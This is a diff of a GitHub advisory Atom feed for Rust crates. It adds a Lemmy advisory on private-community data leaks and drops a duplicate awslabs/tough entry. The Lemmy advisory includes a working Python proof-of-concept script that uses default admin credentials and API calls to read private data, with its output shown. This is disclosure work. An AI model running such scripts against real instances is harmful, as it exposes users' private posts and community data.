@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://azu.github.io/github-advisory-database-rss/rust.rss</id>
     <title>Security Advisory for Rust crates</title>
-    <updated>2026-05-06T22:14:25.225Z</updated>
+    <updated>2026-05-06T23:14:30.630Z</updated>
     <generator>github-advisory-database-rss</generator>
     <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Arust"/>
     <subtitle>Security Advisory for Rust crates on GitHub</subtitle>
@@ -11,6 +11,136 @@
     <category term="HIGH"/>
     <category term="MODERATE"/>
     <category term="LOW"/>
+    <entry>
+        <title type="html"><![CDATA[[lemmy_api] Lemmy may expose private community data through community, saved, liked, and modlog API views]]></title>
+        <id>https://github.com/advisories/GHSA-95q8-x6r6-672m</id>
+        <link href="https://github.com/advisories/GHSA-95q8-x6r6-672m"/>
+        <updated>2026-05-06T22:22:42.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
+<p>Lemmy applies private-community checks in <code>PostView</code> and <code>CommentView</code>, but several adjacent API views skip the accepted-follower filter. Bob, a registered user who is not an accepted follower, can read private community <code>sidebar</code> and <code>summary</code> fields. Alice, a former accepted follower, can still read saved and liked private post bodies after she leaves. An unauthenticated visitor can read private community metadata and removed private post names through the modlog.</p>
+<h2 id="details">Details</h2>
+<p><code>CommunityView::read()</code> and <code>CommunityQuery::list()</code> call <code>visible_communities_only()</code>, but they do not add the private-community filter used by post and comment reads:</p>
+<pre><code class="language-rust">query = my_local_user.visible_communities_only(query);
+query.first(conn).await.with_lemmy_type(LemmyErrorType::NotFound)
+</code></pre>
+<p><code>PersonSavedCombinedQuery::list()</code> and <code>PersonLikedCombinedQuery::list()</code> join <code>community_actions</code>, but they only filter by the requesting person id. They do not require <code>community_actions.follow_state = Accepted</code> when the community has <code>visibility = Private</code>.</p>
+<p>The modlog query returns <code>ListingType::All</code> without a visibility predicate:</p>
+<pre><code class="language-rust">query = match self.listing_type.unwrap_or(ListingType::All) {
+  ListingType::All =&gt; query,
+</code></pre>
+<p>The control paths show the expected check. <code>PostView::read()</code> and <code>CommentView::read()</code> both filter private communities to accepted followers:</p>
+<pre><code class="language-rust">community::visibility
+  .ne(CommunityVisibility::Private)
+  .or(community_actions::follow_state.eq(CommunityFollowerState::Accepted))
+</code></pre>
+<h2 id="proof-of-concept">Proof of Concept</h2>
+<p>The following script reproduces the leak against a fresh Lemmy instance. Tested against <code>dessalines/lemmy:nightly</code> with the default setup account from the sample config. The script opens registration so it can create Alice and Bob.</p>
+<pre><code class="language-python">import requests, random, string
+
+BASE = "http://127.0.0.1:8536/api/v4"  # change to the target Lemmy URL
+ADMIN_USER = "lemmy"
+ADMIN_PASS = "lemmylemmy"
+PASSWORD = "Password123456!"
+
+def req(method, path, token=None, params=None, **body):
+    headers = {}
+    if token:
+        headers["Authorization"] = "Bearer " + token
+    return requests.request(method, BASE + path, headers=headers, params=params, json=body or None)
+
+def register(name):
+    r = req("POST", "/account/auth/register", username=name, password=PASSWORD,
+            password_verify=PASSWORD, email=name + "@example.test")
+    r.raise_for_status()
+    token = r.json()["jwt"]
+    person_id = req("GET", "/account", token).json()["local_user_view"]["person"]["id"]
+    return token, person_id
+
+def show(label, response, marker):
+    text = response.text
+    print("\n" + label + ": HTTP", response.status_code)
+    print(text[:700])
+    print("contains marker:", marker in text)
+
+suffix = "poc" + "".join(random.choice(string.ascii_lowercase) for _ in range(6))
+admin = req("POST", "/account/auth/login", username_or_email=ADMIN_USER, password=ADMIN_PASS).json()["jwt"]
+req("PUT", "/site", admin, registration_mode="open", email_verification_required=False)
+
+alice, alice_id = register("alice" + suffix)
+bob, _ = register("bob" + suffix)
+secret = "SECRET_" + suffix
+
+community = req("POST", "/community", admin,
+                name="priv" + suffix,
+                title="Private Proof " + suffix,
+                sidebar=secret + " sidebar",
+                summary=secret + " summary",
+                visibility="private").json()["community_view"]["community"]
+community_id = community["id"]
+post = req("POST", "/post", admin, name="secret post " + suffix,
+           community_id=community_id, body=secret + " post body").json()["post_view"]["post"]
+post_id = post["id"]
+
+show("Bob reads private community metadata", req("GET", "/community", bob, params={"id": community_id}), secret)
+show("Bob direct post read control", req("GET", "/post", bob, params={"id": post_id}), secret)
+
+req("POST", "/community/follow", alice, community_id=community_id, follow=True)
+req("POST", "/community/pending_follows/approve", admin,
+    community_id=community_id, follower_id=alice_id, approve=True)
+req("PUT", "/post/save", alice, post_id=post_id, save=True)
+req("POST", "/post/like", alice, post_id=post_id, is_upvote=True)
+req("POST", "/community/follow", alice, community_id=community_id, follow=False)
+
+show("Alice direct post read after leaving", req("GET", "/post", alice, params={"id": post_id}), secret)
+show("Alice saved list after leaving", req("GET", "/account/saved", alice), secret)
+show("Alice liked list after leaving", req("GET", "/account/liked", alice), secret)
+
+mod_comm = req("POST", "/community", admin,
+               name="modlog" + suffix,
+               title="Private Modlog " + suffix,
+               sidebar=secret + " modlog sidebar",
+               summary=secret + " modlog summary",
+               visibility="private").json()["community_view"]["community"]
+mod_post = req("POST", "/post", admin, name=secret + " removed post",
+               community_id=mod_comm["id"], body="body").json()["post_view"]["post"]
+req("POST", "/post/remove", admin, post_id=mod_post["id"], removed=True, reason="poc")
+show("Unauthenticated modlog", req("GET", "/modlog", params={"listing_type": "all", "limit": 50}), secret)
+</code></pre>
+<p>Output:</p>
+<pre><code class="language-text">Bob reads private community metadata: HTTP 200
+contains marker: True
+Bob direct post read control: HTTP 404
+contains marker: False
+Alice direct post read after leaving: HTTP 404
+contains marker: False
+Alice saved list after leaving: HTTP 200
+contains marker: True
+Alice liked list after leaving: HTTP 200
+contains marker: True
+Unauthenticated modlog: HTTP 200
+contains marker: True
+</code></pre>
+<h2 id="impact">Impact</h2>
+<p>Bob can read private community descriptions and sidebars before a moderator approves him. Alice can leave a private community, or a moderator can remove her, and Lemmy still returns private post bodies that Alice saved or liked while she was a member. An unauthenticated visitor can use the public modlog to discover private community metadata and removed private post names.</p>
+<h2 id="recommended-fix">Recommended Fix</h2>
+<p>Apply the same private-community filter used by <code>PostView</code> and <code>CommentView</code> to <code>CommunityView::read()</code>, <code>CommunityQuery::list()</code>, <code>PersonSavedCombinedQuery::list()</code>, <code>PersonLikedCombinedQuery::list()</code>, and the <code>ListingType::All</code> branch of the modlog query. Admins and accepted followers should keep access. Other callers should receive the same <code>404</code> behavior as <code>GET /post</code> and <code>GET /comment</code>.</p>
+<hr>
+<p><em>Found by <a href="https://aisafe.io">aisafe.io</a></em></p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/LemmyNet/lemmy/security/advisories/GHSA-95q8-x6r6-672m">https://github.com/LemmyNet/lemmy/security/advisories/GHSA-95q8-x6r6-672m</a></li>
+<li><a href="https://github.com/LemmyNet/lemmy/commit/637151121a8e27b2b8c95e98d6f86966b31b4a6d">https://github.com/LemmyNet/lemmy/commit/637151121a8e27b2b8c95e98d6f86966b31b4a6d</a></li>
+<li><a href="https://github.com/advisories/GHSA-95q8-x6r6-672m">https://github.com/advisories/GHSA-95q8-x6r6-672m</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-95q8-x6r6-672m</uri>
+        </author>
+        <category label="severity" term="MODERATE"/>
+        <published>2026-05-06T22:22:41.000Z</published>
+    </entry>
     <entry>
         <title type="html"><![CDATA[[lemmy_api] Private Lemmy instances expose multi-community metadata without authentication]]></title>
         <id>https://github.com/advisories/GHSA-jmxc-hhwx-gvv3</id>
@@ -1895,48 +2025,6 @@ Captured: Authorization: Basic dmljdGltLXVzZXI6c3VwZXItc2VjcmV0LXRva2Vu
     </entry>
     <entry>
         <title type="html"><![CDATA[[tuftool] awslabs/tough is Missing Delegated Metadata Validation]]></title>
-        <id>https://github.com/advisories/GHSA-4v58-8p28-2rq3</id>
-        <link href="https://github.com/advisories/GHSA-4v58-8p28-2rq3"/>
-        <updated>2026-05-05T18:46:50.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
-<p>Missing expiration, hash, and length enforcement in delegated metadata validation in awslabs/tough before tough-v0.22.0 allows remote authenticated users with delegated signing authority to bypass TUF specification integrity checks for delegated targets metadata and poison the local metadata cache, because load_delegations does not apply the same validation checks as the top-level targets metadata path.</p>
-<h3 id="impact">Impact</h3>
-<p>The tough library, prior to 0.22.0, does not properly verify delegated target metadata. It allows someone with write access to the metadata to serve expired or otherwise invalid targets from a TUF repository which tough will then trust rather than reject.</p>
-<h3 id="impacted-versions">Impacted Versions:</h3>
-<p>tough 0.9.0 through 0.21.x, tuftool through 0.14.x</p>
-<h3 id="patches">Patches</h3>
-<p>This issue has been addressed in tough version 0.22.0 and tuftool version 0.15.0. We recommend upgrading to the latest version and ensuring any forked or derivative code is patched to incorporate the new fixes. </p>
-<h3 id="workarounds">Workarounds</h3>
-<p>No workarounds to this issue are known.</p>
-<h3 id="references">References</h3>
-<ul>
-<li>CVE-2026-6967
-If there are any questions or comments about this advisory, please contact [AWS/Amazon] Security via the <a href="https://aws.amazon.com/security/vulnerability-reporting">vulnerability reporting page</a> or directly via email to <a href="mailto:aws-security@amazon.com">aws-security@amazon.com</a>. Please do not create a public GitHub issue.</li>
-</ul>
-<h3 id="acknowledgement">Acknowledgement</h3>
-<p>Amazon Web Services Labs would like to thank Oleh Konko of 1seal for collaborating on this issue through the coordinated vulnerability disclosure process.</p>
-<h3 id="references-1">References</h3>
-<ul>
-<li><a href="https://github.com/awslabs/tough/security/advisories/GHSA-4v58-8p28-2rq3">https://github.com/awslabs/tough/security/advisories/GHSA-4v58-8p28-2rq3</a></li>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-6967">https://nvd.nist.gov/vuln/detail/CVE-2026-6967</a></li>
-<li><a href="https://aws.amazon.com/security/security-bulletins/2026-019-aws">https://aws.amazon.com/security/security-bulletins/2026-019-aws</a></li>
-<li><a href="https://crates.io/crates/tough/0.22.0">https://crates.io/crates/tough/0.22.0</a></li>
-<li><a href="https://crates.io/crates/tuftool/0.15.0">https://crates.io/crates/tuftool/0.15.0</a></li>
-<li><a href="https://github.com/awslabs/tough/releases/tag/tough-v0.22.0">https://github.com/awslabs/tough/releases/tag/tough-v0.22.0</a></li>
-<li><a href="https://github.com/awslabs/tough/releases/tag/tuftool-v0.15.0">https://github.com/awslabs/tough/releases/tag/tuftool-v0.15.0</a></li>
-<li><a href="https://github.com/advisories/GHSA-4v58-8p28-2rq3">https://github.com/advisories/GHSA-4v58-8p28-2rq3</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-4v58-8p28-2rq3</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2026-05-05T18:46:48.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[tough] awslabs/tough is Missing Delegated Metadata Validation]]></title>
         <id>https://github.com/advisories/GHSA-4v58-8p28-2rq3</id>
         <link href="https://github.com/advisories/GHSA-4v58-8p28-2rq3"/>
         <updated>2026-05-05T18:46:50.000Z</updated>
